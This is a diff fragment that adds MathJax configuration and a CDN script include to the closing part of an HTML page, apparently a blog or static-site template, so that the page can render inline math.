+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
